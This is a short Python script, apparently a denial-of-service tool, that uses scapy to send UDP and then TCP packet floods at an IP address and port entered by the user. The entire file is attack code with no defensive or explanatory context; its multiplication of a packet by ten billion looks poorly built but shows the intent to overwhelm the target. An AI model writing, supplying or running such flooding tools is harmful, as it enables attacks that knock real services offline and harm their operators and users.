from scapy.all import *

def udp_flood(target_ip, target_port):
    src_port = RandShort()
    payload = "X" * 128
    packet = IP(dst=target_ip)/UDP(dport=target_port, sport=src_port)/payload
    send(packet*10000000000, verbose=0)

def tcp_flood(target_ip, target_port):
    src_port = RandShort()
    payload = "X" * 128
    packet = IP(dst=target_ip)/TCP(dport=target_port, sport=src_port)/payload
    send(packet*10000000000, verbose=0)

target_ip = input("Enter target IP address: ")
target_port = int(input("Enter target port: "))

print("Sending UDP flood...")
udp_flood(target_ip, target_port)

print("Sending TCP flood...")
tcp_flood(target_ip, target_port)
